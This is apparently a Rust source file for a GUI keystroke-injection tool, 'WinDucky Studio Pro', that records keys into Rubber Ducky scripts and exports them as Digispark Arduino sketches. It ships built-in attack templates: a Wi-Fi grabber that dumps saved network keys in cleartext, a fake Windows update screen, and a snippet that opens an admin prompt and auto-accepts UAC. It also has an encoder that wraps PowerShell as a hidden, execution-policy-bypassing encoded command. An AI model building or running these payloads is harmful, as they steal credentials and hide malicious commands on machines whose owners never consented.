#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")] // Oculta consola en Release

use eframe::egui;
use rdev::{listen, Event, EventType, Key};
use std::sync::mpsc::{channel, Receiver};
use std::thread;
use std::time::{SystemTime};
use std::fs::File;
use std::io::Write;
use rand::Rng;
use base64::{Engine as _, engine::general_purpose};
use enigo::{Enigo, KeyboardControllable};

const MIN_DELAY_MS: u128 = 250;

struct PayloadTemplate {
    name: &'static str,
    content: &'static str,
}

const TEMPLATES: &[PayloadTemplate] = &[
    PayloadTemplate {
        name: "Wifi Grabber (Webhook)",
        content: "GUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING $w=(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}\nENTER",
    },
    PayloadTemplate {
        name: "Fake Update Screen",
        content: "GUI r\nDELAY 200\nSTRING chrome --kiosk http://fakeupdate.net/win10u/index.html \nENTER",
    },
    PayloadTemplate {
        name: "System Info Dump",
        content: "GUI r\nDELAY 500\nSTRING cmd /k \"systeminfo & ipconfig /all\"\nENTER",
    },
];

fn load_icon() -> eframe::egui::IconData {
    let (icon_rgba, icon_width, icon_height) = {
        let image = image::load_from_memory(include_bytes!("../icon.ico"))
            .expect("Fallo al cargar el icono")
            .into_rgba8();
        let (width, height) = image.dimensions();
        let rgba = image.into_raw();
        (rgba, width, height)
    };
    
    eframe::egui::IconData {
        rgba: icon_rgba,
        width: icon_width,
        height: icon_height,
    }
}

fn main() -> eframe::Result<()> {
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size([950.0, 700.0])
            .with_icon(load_icon()), 
        ..Default::default()
    };
    
    let (tx, rx) = channel();

    thread::spawn(move || {
        listen(move |event| {
            let _ = tx.send(event);
        }).expect("Error al inicializar hook de teclado");
    });

    eframe::run_native(
        "DuckyStudio",
        options,
        Box::new(|_cc| Box::new(DuckyApp::new(rx))),
    )
}

struct DuckyApp {
    receiver: Receiver<Event>,
    is_recording: bool,
    script: String,
    buffer: String,
    last_time: SystemTime,
    status_msg: String,
    
    // Estados Lógicos
    gui_held: bool,
    ctrl_held: bool,
    alt_held: bool,
    modifier_used: bool,
    
    // Inputs de Herramientas
    ps_input: String,
}

impl DuckyApp {
    fn new(receiver: Receiver<Event>) -> Self {
        Self {
            receiver,
            is_recording: false,
            script: String::from("REM WinDucky Studio Pro - Ready\n"),
            buffer: String::new(),
            last_time: SystemTime::now(),
            status_msg: String::from("Esperando comando..."),
            gui_held: false, ctrl_held: false, alt_held: false, modifier_used: false,
            ps_input: String::new(),
        }
    }

    // ==========================================
    // LÓGICA DE GRABACIÓN (CORE)
    // ==========================================
    fn process_event(&mut self, event: Event) {
        match event.event_type {
            EventType::KeyPress(key) => self.handle_press(key, event.name),
            EventType::KeyRelease(key) => self.handle_release(key),
            _ => {}
        }
    }

    fn handle_press(&mut self, key: Key, name: Option<String>) {
        // Detectar modificadores
        match key {
            Key::MetaLeft | Key::MetaRight => { self.gui_held = true; self.modifier_used = false; return; },
            Key::ControlLeft | Key::ControlRight => { self.ctrl_held = true; return; },
            Key::Alt | Key::AltGr => { self.alt_held = true; return; },
            Key::Escape => { self.stop_recording(); return; },
            _ => {}
        }

        // Auto Delay
        let now = SystemTime::now();
        if let Ok(duration) = now.duration_since(self.last_time) {
            let millis = duration.as_millis();
            if millis > MIN_DELAY_MS {
                self.flush_buffer();
                self.append_line(&format!("DELAY {}", millis));
            }
        }
        self.last_time = now;

        // Lógica de Combos
        if self.gui_held {
            self.flush_buffer();
            let k = self.map_key_to_str(key).unwrap_or(name.as_deref().unwrap_or(""));
            if !k.is_empty() { self.append_line(&format!("GUI {}", k)); }
            self.modifier_used = true;
        } else if self.ctrl_held {
            self.flush_buffer();
            let k = self.map_key_to_str(key).unwrap_or(name.as_deref().unwrap_or(""));
            if !k.is_empty() { self.append_line(&format!("CTRL {}", k)); }
        } else if self.alt_held {
             self.flush_buffer();
             let k = self.map_key_to_str(key).unwrap_or(name.as_deref().unwrap_or(""));
             if !k.is_empty() { self.append_line(&format!("ALT {}", k)); }
        } else {
            // Texto Normal
            match key {
                Key::Backspace => {
                    if !self.buffer.is_empty() { self.buffer.pop(); } 
                    else { self.append_line("BACKSPACE"); }
                },
                Key::Return => self.push_special("ENTER"),
                Key::Tab => self.push_special("TAB"),
                Key::Space => self.buffer.push(' '),
                _ => {
                    if let Some(special) = self.map_key_to_str(key) { self.push_special(special); }
                    else if let Some(n) = name { self.buffer.push_str(&n); }
                }
            }
        }
    }

    fn handle_release(&mut self, key: Key) {
        if let Key::MetaLeft | Key::MetaRight = key {
            self.gui_held = false;
            if !self.modifier_used { self.push_special("GUI"); }
        } else if let Key::ControlLeft | Key::ControlRight = key { self.ctrl_held = false; }
          else if let Key::Alt | Key::AltGr = key { self.alt_held = false; }
    }

    fn map_key_to_str(&self, key: Key) -> Option<&'static str> {
        match key {
            Key::Return => Some("ENTER"), Key::Tab => Some("TAB"), Key::Escape => Some("ESCAPE"),
            Key::Delete => Some("DELETE"), Key::UpArrow => Some("UPARROW"), Key::DownArrow => Some("DOWNARROW"),
            Key::LeftArrow => Some("LEFTARROW"), Key::RightArrow => Some("RIGHTARROW"),
            Key::PageUp => Some("PAGEUP"), Key::PageDown => Some("PAGEDOWN"),
            Key::Home => Some("HOME"), Key::End => Some("END"),
            Key::F1=>Some("F1"), Key::F2=>Some("F2"), Key::F3=>Some("F3"), Key::F4=>Some("F4"),
            Key::F5=>Some("F5"), Key::F6=>Some("F6"), Key::F7=>Some("F7"), Key::F8=>Some("F8"),
            Key::F9=>Some("F9"), Key::F10=>Some("F10"), Key::F11=>Some("F11"), Key::F12=>Some("F12"),
            Key::CapsLock => Some("CAPSLOCK"), _ => None,
        }
    }

    fn stop_recording(&mut self) {
        self.is_recording = false;
        self.flush_buffer();
        self.append_line("\nREM --- END RECORDING ---");
        self.status_msg = "Grabación detenida.".to_string();
    }

    fn flush_buffer(&mut self) {
        if !self.buffer.is_empty() {
            self.append_line(&format!("STRING {}", self.buffer));
            self.buffer.clear();
        }
    }
    
    fn push_special(&mut self, cmd: &str) { self.flush_buffer(); self.append_line(cmd); }
    fn append_line(&mut self, line: &str) { self.script.push_str(line); self.script.push('\n'); }

    fn save_file(&mut self) {
        if let Some(path) = rfd::FileDialog::new().add_filter("txt", &["txt"]).save_file() {
            if let Ok(mut file) = File::create(path) {
                let _ = file.write_all(self.script.as_bytes());
                self.status_msg = "Archivo guardado exitosamente.".to_string();
            }
        }
    }

    // ==========================================
    // HERRAMIENTAS (TOOLBOX)
    // ==========================================

    // 1. Simulación Local (Playback)
    fn run_simulation(&mut self) {
        let script_clone = self.script.clone();
        
        thread::spawn(move || {
            let mut enigo = Enigo::new();
            thread::sleep(std::time::Duration::from_secs(3)); // Tiempo para foco
            
            for line in script_clone.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty() || trimmed.starts_with("REM") { continue; }
                
                if trimmed.starts_with("DELAY ") {
                    if let Ok(ms) = trimmed.replace("DELAY ", "").parse::<u64>() {
                        thread::sleep(std::time::Duration::from_millis(ms));
                    }
                } 
                else if trimmed.starts_with("STRING ") {
                    let text = trimmed.strip_prefix("STRING ").unwrap_or("");
                    enigo.key_sequence(text);
                }
                else if trimmed == "ENTER" { enigo.key_click(enigo::Key::Return); }
                else if trimmed == "TAB" { enigo.key_click(enigo::Key::Tab); }
                else if trimmed == "GUI r" { 
                    enigo.key_down(enigo::Key::Meta);
                    enigo.key_click(enigo::Key::Layout('r'));
                    enigo.key_up(enigo::Key::Meta);
                }
                // Agregar mapeos adicionales según necesidad
            }
        });
        self.status_msg = "Simulando en 3s... (Cambia ventana)".to_string();
    }

    // 2. Jitter
    fn apply_jitter(&mut self) {
        let mut rng = rand::thread_rng();
        let mut new_script = String::new();
        
        for line in self.script.lines() {
            if line.starts_with("DELAY ") {
                if let Ok(val) = line.replace("DELAY ", "").trim().parse::<i32>() {
                    let variation = (val as f32 * 0.2) as i32;
                    let jitter = rng.gen_range(-variation..=variation);
                    let final_val = (val + jitter).max(50);
                    new_script.push_str(&format!("DELAY {}\n", final_val));
                } else {
                    new_script.push_str(line); new_script.push('\n');
                }
            } else {
                new_script.push_str(line); new_script.push('\n');
            }
        }
        self.script = new_script;
        self.status_msg = "Jitter aplicado.".to_string();
    }

    // 3. Encoder PowerShell
    fn encode_powershell(&mut self) {
        if self.ps_input.is_empty() { return; }
        
        let mut utf16_bytes: Vec<u8> = Vec::new();
        for char in self.ps_input.encode_utf16() {
            utf16_bytes.push((char & 0xFF) as u8);
            utf16_bytes.push((char >> 8) as u8);
        }
        
        let b64 = general_purpose::STANDARD.encode(&utf16_bytes);
        
        self.flush_buffer();
        self.script.push_str("\nREM [Encoded PowerShell]\n");
        self.script.push_str(&format!(
            "STRING powershell -NoP -W Hidden -Exec Bypass -Enc {}\nENTER\n", 
            b64
        ));
        self.ps_input.clear();
        self.status_msg = "PS Payload inyectado.".to_string();
    }

    // 4. Minificador
    fn minify_script(&mut self) {
        let mut minified = String::new();
        for line in self.script.lines() {
            let trim = line.trim();
            if !trim.is_empty() && !trim.starts_with("REM") {
                minified.push_str(trim);
                minified.push('\n');
            }
        }
        self.script = minified;
        self.status_msg = "Script minificado.".to_string();
    }

    // 5. Exportar Arduino
    fn export_to_arduino(&mut self) {
        let mut arduino_code = String::from(
            "#include \"DigiKeyboard.h\"\n\nvoid setup() {\n  DigiKeyboard.sendKeyStroke(0);\n"
        );
        
        for line in self.script.lines() {
            if line.starts_with("STRING ") {
                let content = line.strip_prefix("STRING ").unwrap().replace("\"", "\\\"").replace("\\", "\\\\");
                arduino_code.push_str(&format!("  DigiKeyboard.print(\"{}\");\n", content));
            } else if line.starts_with("DELAY ") {
                let ms = line.strip_prefix("DELAY ").unwrap();
                arduino_code.push_str(&format!("  DigiKeyboard.delay({});\n", ms));
            } else if line.trim() == "ENTER" {
                arduino_code.push_str("  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n");
            } else if line.trim() == "GUI r" {
                arduino_code.push_str("  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);\n");
            }
        }
        
        arduino_code.push_str("}\n\nvoid loop() {}");
        
        if let Some(path) = rfd::FileDialog::new().set_file_name("sketch.ino").save_file() {
             if let Ok(mut file) = File::create(path) {
                let _ = file.write_all(arduino_code.as_bytes());
                self.status_msg = "Exportado a Arduino (.ino)".to_string();
            }
        }
    }
}

// ==========================================
// INTERFAZ DE USUARIO (GUI)
// ==========================================
impl eframe::App for DuckyApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        // Leer eventos de teclado del hilo
        while let Ok(event) = self.receiver.try_recv() {
            if self.is_recording {
                self.process_event(event);
                ctx.request_repaint();
            }
        }

        // --- PANEL DERECHO (TOOLBOX) ---
        egui::SidePanel::right("toolbox_panel").min_width(240.0).show(ctx, |ui| {
            ui.add_space(5.0);
            ui.heading("Arsenal");
            ui.separator();

            ui.label("Templates:");
            egui::ComboBox::from_label("")
                .selected_text("Cargar Payload...")
                .show_ui(ui, |ui| {
                    for template in TEMPLATES {
                        if ui.selectable_label(false, template.name).clicked() {
                            self.script.push_str(&format!("\nREM --- {} ---\n", template.name));
                            self.script.push_str(template.content);
                            self.script.push('\n');
                        }
                    }
                });
            
            ui.add_space(10.0);
            ui.heading("Herramientas");
            ui.separator();

            if ui.button("Simular (Run Local)").on_hover_text("Ejecuta el script en esta PC en 3 segundos").clicked() {
                self.run_simulation();
            }
            if ui.button("Minificar Script").on_hover_text("Elimina espacios y comentarios").clicked() {
                self.minify_script();
            }
            if ui.button("Exportar Arduino (.ino)").clicked() {
                self.export_to_arduino();
            }
            if ui.button("Aplicar Jitter (+/- 20%)").clicked() { 
                self.apply_jitter(); 
            }

            ui.add_space(10.0);
            ui.heading("Encoder PowerShell");
            ui.separator();
            ui.text_edit_singleline(&mut self.ps_input);
            if ui.button("Inyectar Base64 Encoded").clicked() {
                self.encode_powershell();
            }

            ui.add_space(10.0);
            ui.label("Snippets Rápidos:");
            if ui.button("Run Dialog (Win+R)").clicked() {
                self.flush_buffer(); self.script.push_str("GUI r\nDELAY 500\n");
            }
            if ui.button("Admin CMD").clicked() {
                self.flush_buffer();
                self.script.push_str("CTRL ESC\nDELAY 500\nSTRING cmd\nDELAY 500\nCTRL SHIFT ENTER\nDELAY 1000\nALT y\n");
            }
        });

        // --- PANEL CENTRAL ---
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("WinDucky Studio Pro");
            ui.separator();
            
            ui.horizontal(|ui| {
                let btn_text = if self.is_recording { "DETENER (ESC)" } else { "GRABAR" };
                if ui.add(egui::Button::new(btn_text).min_size([120.0, 30.0].into())).clicked() {
                    self.is_recording = !self.is_recording;
                    if self.is_recording {
                        self.last_time = SystemTime::now();
                        self.status_msg = "Grabando...".to_string();
                    } else {
                        self.flush_buffer();
                        self.status_msg = "Pausado".to_string();
                    }
                }
                
                if ui.add(egui::Button::new("Guardar").min_size([80.0, 30.0].into())).clicked() { 
                    self.save_file(); 
                }
                
                if ui.add(egui::Button::new("Limpiar").min_size([80.0, 30.0].into())).clicked() { 
                    self.script.clear(); 
                    self.status_msg = "Lienzo limpio.".to_string();
                }
            });
            
            ui.add_space(5.0);
            ui.label(egui::RichText::new(&self.status_msg).color(egui::Color32::LIGHT_BLUE));
            ui.separator();
            
            egui::ScrollArea::vertical().stick_to_bottom(true).show(ui, |ui| {
                ui.add_sized(
                    ui.available_size(), 
                    egui::TextEdit::multiline(&mut self.script)
                        .font(egui::TextStyle::Monospace)
                        .lock_focus(false)
                );
            });
        });
    }
}